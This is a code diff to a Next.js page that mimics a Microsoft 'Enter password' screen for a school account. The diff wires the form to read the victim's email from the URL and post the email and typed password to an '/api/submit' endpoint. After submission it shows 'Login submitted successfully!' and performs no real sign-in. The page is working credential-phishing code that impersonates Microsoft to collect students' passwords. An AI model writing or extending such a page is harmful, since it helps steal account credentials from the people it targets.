@@ -1,4 +1,45 @@
-export default function PasswordPage() {
+"use client";
+
+import { useState, useEffect, Suspense } from 'react';
+import { useSearchParams } from 'next/navigation';
+
+function PasswordForm() {
+  const searchParams = useSearchParams();
+  const email = searchParams.get('email') || '';
+  const [password, setPassword] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const [message, setMessage] = useState('');
+
+  useEffect(() => {
+    // Pre-fill email display from URL
+  }, [email]);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsLoading(true);
+    setMessage('');
+
+    try {
+      const response = await fetch('/api/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ email, password }),
+      });
+
+      if (response.ok) {
+        setMessage('Login submitted successfully!');
+      } else {
+        setMessage('Failed to submit. Please try again.');
+      }
+    } catch (error) {
+      setMessage('An error occurred. Please try again.');
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
   return (
     <main className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
       {/* Microsoft Logo */}
@@ -39,10 +80,10 @@ export default function PasswordPage() {
           
           <div className="flex items-center gap-3">
             <div className="w-8 h-8 rounded-full bg-[#0067b8] flex items-center justify-center text-white text-sm font-medium">
-              S
+              {email.charAt(0).toUpperCase()}
             </div>
             <div>
-              <p className="text-sm text-gray-700">student@school.edu</p>
+              <p className="text-sm text-gray-700">{email}</p>
               <p className="text-xs text-gray-500">School account</p>
             </div>
           </div>
@@ -50,7 +91,13 @@ export default function PasswordPage() {
         
         <h1 className="text-2xl font-semibold text-gray-900 mb-6">Enter password</h1>
         
-        <form className="space-y-4">
+        {message && (
+          <div className={`mb-4 p-3 rounded ${message.includes('success') ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'}`}>
+            {message}
+          </div>
+        )}
+        
+        <form className="space-y-4" onSubmit={handleSubmit}>
           <div>
             <label 
               htmlFor="password" 
@@ -61,8 +108,11 @@ export default function PasswordPage() {
             <input
               id="password"
               type="password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
               className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-base"
               autoComplete="off"
+              required
             />
           </div>
 
@@ -79,9 +129,10 @@ export default function PasswordPage() {
           <div className="pt-2">
             <button
               type="submit"
-              className="w-full bg-[#0067b8] text-white font-semibold py-2.5 px-4 rounded hover:bg-[#005a9e] transition-colors"
+              disabled={isLoading}
+              className="w-full bg-[#0067b8] text-white font-semibold py-2.5 px-4 rounded hover:bg-[#005a9e] transition-colors disabled:opacity-50"
             >
-              Sign in
+              {isLoading ? 'Signing in...' : 'Sign in'}
             </button>
           </div>
         </form>
@@ -123,5 +174,13 @@ export default function PasswordPage() {
         </div>
       </footer>
     </main>
+  );
+}
+
+export default function PasswordPage() {
+  return (
+    <Suspense fallback={<div>Loading...</div>}>
+      <PasswordForm />
+    </Suspense>
   );
 }
